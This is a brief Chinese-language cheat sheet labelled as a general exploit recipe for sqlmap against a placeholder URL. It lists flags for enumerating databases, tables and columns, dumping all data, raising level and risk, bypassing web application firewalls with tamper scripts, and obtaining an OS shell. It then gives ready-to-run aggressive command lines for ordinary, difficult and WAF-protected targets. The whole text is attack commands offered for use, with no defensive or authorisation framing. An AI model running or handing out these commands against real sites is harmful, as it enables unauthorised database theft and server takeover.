--------------------通用exp
sqlmap -u "这里是地址，例https://www.xxx.com/?id=1" --dbs

参数
--dbs  看库名 -D xxx 指定库名xxx
--tables  表名  -T 指定表名
--columns  列名  -C 
--threads X 使用进程数1-10
--dump  直接导出
--batch  全自动模式，使用默认选择
--level=X  提供绕过等级1-5
--risk=X  1-3
--tamper=space2comment.py  使用脚本绕过WAF
--os-shell  权限足够大直接拿shell

一般而言：
sqlmap -u "https://www.xxx.com/?id=1" --batch --threads 10 --level=3 --risk=3 --columns --dump

如果难
sqlmap -u "https://www.xxx.com/?id=1" --batch --threads 10 --level=5 --risk=3 --dbs  ——————>  再接tables，columns一个个来

绕过：
sqlmap -u "https://www.xxx.com/?id=1" --batch --threads 10 --level=5 --risk=3 --tamper=space2comment.py --dbs